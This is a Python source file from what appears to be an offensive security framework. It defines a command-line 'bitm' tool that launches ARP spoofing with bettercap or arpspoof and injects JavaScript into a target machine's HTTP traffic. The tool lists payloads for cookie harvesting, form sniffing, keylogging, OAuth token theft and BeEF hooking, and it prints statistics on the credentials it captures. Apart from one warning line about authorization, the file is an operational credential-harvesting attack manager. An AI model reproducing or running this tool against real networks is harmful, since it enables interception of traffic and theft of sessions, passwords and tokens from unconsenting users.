"""Browser-in-the-Middle CLI command set.

Automates ARP spoofing + transparent HTTP injection attacks to harvest
browser sessions, cookies, OAuth tokens, form data, and keystrokes
from target machines on the local network.
"""

from __future__ import annotations

import shlex

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    lateral_movement_category,
    print_error,
    print_msg,
    print_succ,
    print_warn,
)


class BitMCommandSet(LazyOwnCommandSet):
    """Browser-in-the-Middle — ARP spoofing + JS injection credential harvester."""

    phase = "lateral"
    category = lateral_movement_category

    @cmd2.with_category(lateral_movement_category)
    def do_bitm(self, line):
        """Browser-in-the-Middle attack manager.

        Usage:
            bitm start <target_ip> [--gateway <ip>] [--interface <iface>] [--lport <port>] [--payloads <p1,p2,...>]
            bitm stop
            bitm status
            bitm inject <payload_name>
            bitm harvest
            bitm cleanup

        Starts ARP spoofing (bettercap or arpspoof) against the target and
        transparently injects JavaScript payloads into HTTP responses to
        harvest browser sessions.

        Requires: root/sudo, bettercap or dsniff (arpspoof).

        Available JS payloads:
            cookie_harvest  — capture all document.cookie
            form_sniff     — log every form submission
            keylogger      — keystroke capture
            screenshot     — html2canvas page screenshot (needs html2canvas on victim)
            oauth_token_grab — steal OAuth tokens from localStorage/sessionStorage/cookies
            beef_hook      — inject BeEF hook script

        Examples:
            bitm start 192.168.1.105
            bitm start 192.168.1.105 --payloads cookie_harvest,form_sniff,oauth_token_grab
            bitm inject keylogger
            bitm harvest
            bitm stop
        """
        args = shlex.split(line)
        if not args:
            print_msg("BitM — Browser-in-the-Middle attack manager.")
            print_msg("Usage: bitm <start|stop|status|inject|harvest|cleanup> [options]")
            print_msg("")
            print_msg("  bitm start <target_ip>  — launch ARP spoofing + JS inject attack")
            print_msg("  bitm stop              — stop attack, restore network, show harvest summary")
            print_msg("  bitm status            — show active attack details")
            print_msg("  bitm inject <payload>  — add a JS payload to active session")
            print_msg("  bitm harvest           — show harvested credentials/statistics")
            print_msg("  bitm cleanup           — force-kill all BitM processes")
            return

        action = args[0].lower()
        rest = args[1:] if len(args) > 1 else []

        if action == "start":
            self._bitm_start(rest)
        elif action == "stop":
            self._bitm_stop()
        elif action == "status":
            self._bitm_status()
        elif action == "inject":
            self._bitm_inject(rest)
        elif action == "harvest":
            self._bitm_harvest()
        elif action == "cleanup":
            self._bitm_cleanup()
        else:
            print_error(f"Unknown action: {action}. Use start, stop, status, inject, harvest, or cleanup.")

    def _bitm_start(self, args: list[str]):
        """Parse arguments and launch the BitM attack."""
        target_ip = ""
        gateway_ip = ""
        interface = ""
        lport = 8080
        payloads = None

        i = 0
        while i < len(args):
            if args[i] == "--gateway" and i + 1 < len(args):
                i += 1
                gateway_ip = args[i]
            elif args[i] == "--interface" and i + 1 < len(args):
                i += 1
                interface = args[i]
            elif args[i] == "--lport" and i + 1 < len(args):
                i += 1
                try:
                    lport = int(args[i])
                except ValueError:
                    print_error(f"Invalid port: {args[i]}")
                    return
            elif args[i] == "--payloads" and i + 1 < len(args):
                i += 1
                payloads = [p.strip() for p in args[i].split(",")]
            elif not args[i].startswith("--") and not target_ip:
                target_ip = args[i]
            i += 1

        if not target_ip:
            print_error("Target IP required.")
            print_msg("Usage: bitm start <target_ip> [options]")
            return

        lhost = self.params.get("lhost", "")
        if not lhost:
            print_error("Set lhost first: assign lhost <your_ip>")
            return

        try:
            from modules.bitm_engine import bitm_start
        except ImportError as exc:
            print_error(f"BitM engine not available: {exc}")
            return

        print_msg(f"Launching BitM attack against {target_ip} ...")
        print_warn("This requires ARP spoofing (MITM). Ensure you have authorization!")
        print_warn("Running with bettercap or arpspoof. Elevating privileges may be required.")

        result = bitm_start(
            target_ip=target_ip,
            gateway_ip=gateway_ip,
            interface=interface,
            lhost=lhost,
            lport=lport,
            payloads=payloads,
        )

        if result.get("success"):
            state = result.get("state", {})
            print_succ("BitM attack launched successfully!")
            print_msg(f"  Method:    {state.get('method')}")
            print_msg(f"  Target:    {state.get('target_ip')}")
            print_msg(f"  Gateway:   {state.get('gateway_ip')}")
            print_msg(f"  Interface: {state.get('interface')}")
            print_msg(f"  Payloads:  {', '.join(state.get('payloads', []))}")
            print_msg("  Harvest:   sessions/bitm/bitm_harvest.log")
            print_msg("")
            print_msg("Monitor with: tail -f sessions/bitm/bitm_harvest.log")
            print_msg("Stop with:    bitm stop")
        else:
            print_error(result.get("error", "Failed to start BitM attack."))

    def _bitm_stop(self):
        """Stop the BitM attack and display harvest summary."""
        try:
            from modules.bitm_engine import bitm_stop
        except ImportError as exc:
            print_error(f"BitM engine not available: {exc}")
            return

        print_msg("Stopping BitM attack...")
        result = bitm_stop()

        if result.get("success"):
            print_succ("BitM attack stopped.")
            print_msg(f"  Duration: {result.get('duration_seconds', 0)}s")
            print_msg(f"  Harvested lines: {result.get('harvested_lines', 0)}")
            print_msg(f"  Harvest file: {result.get('harvest_file', '')}")
            print_msg(f"  Captives file: {result.get('captives_file', '')}")
            print_msg("")
            print_msg("Review harvested data:")
            print_msg(f"  cat {result.get('harvest_file', '')}")
        else:
            print_error(result.get("error", "Failed to stop BitM attack."))

    def _bitm_status(self):
        """Show active BitM attack details."""
        try:
            from modules.bitm_engine import bitm_status
        except ImportError as exc:
            print_error(f"BitM engine not available: {exc}")
            return

        status = bitm_status()
        if not status.get("active"):
            print_msg("No active BitM attack.")
            print_msg("Start one with: bitm start <target_ip>")
            return

        print_msg("Active BitM attack:")
        print_msg(f"  Target:    {status.get('target_ip')}")
        print_msg(f"  Gateway:   {status.get('gateway_ip')}")
        print_msg(f"  Interface: {status.get('interface')}")
        print_msg(f"  Method:    {status.get('method')}")
        print_msg(f"  Uptime:    {status.get('uptime_seconds', 0)}s")
        print_msg(f"  Payloads:  {', '.join(status.get('payloads', []))}")
        print_msg(f"  Harvest:   {status.get('harvest_line_count', 0)} lines")

    def _bitm_inject(self, args: list[str]):
        """Inject an additional JS payload into an active BitM session."""
        if not args:
            print_error("Specify a payload name to inject.")
            from modules.bitm_engine import JS_INJECT_PAYLOADS

            print_msg("Available payloads:")
            for name, code in JS_INJECT_PAYLOADS.items():
                desc = code.strip()[:60]
                print_msg(f"  {name}  — {desc}...")
            return

        payload_name = args[0]
        try:
            from modules.bitm_engine import bitm_inject
        except ImportError as exc:
            print_error(f"BitM engine not available: {exc}")
            return

        result = bitm_inject(payload_name)
        if result.get("success"):
            print_succ(f"Payload '{payload_name}' injected into active session.")
        else:
            print_error(result.get("error", "Injection failed."))

    def _bitm_harvest(self):
        """Show harvested credential statistics."""
        try:
            from modules.bitm_engine import bitm_harvest_stats
        except ImportError as exc:
            print_error(f"BitM engine not available: {exc}")
            return

        stats = bitm_harvest_stats()
        print_msg("BitM Harvest Statistics:")
        print_msg(f"  Cookies captured:   {stats.get('cookies', 0)}")
        print_msg(f"  Form submissions:   {stats.get('forms', 0)}")
        print_msg(f"  Keystroke packets:  {stats.get('keystrokes', 0)}")
        print_msg(f"  Tokens/oauth:       {stats.get('tokens', 0)}")
        print_msg(f"  Total events:       {stats.get('total_lines', 0)}")
        print_msg("")
        print_msg("Full log: sessions/bitm/bitm_harvest.log")

    def _bitm_cleanup(self):
        """Force-kill all BitM processes and remove state."""
        try:
            from modules.bitm_engine import bitm_cleanup
        except ImportError as exc:
            print_error(f"BitM engine not available: {exc}")
            return

        result = bitm_cleanup()
        if result.get("success"):
            print_succ("BitM cleanup complete. All processes killed, state removed.")
        else:
            print_error(result.get("error", "Cleanup failed."))


__all__ = ["BitMCommandSet"]
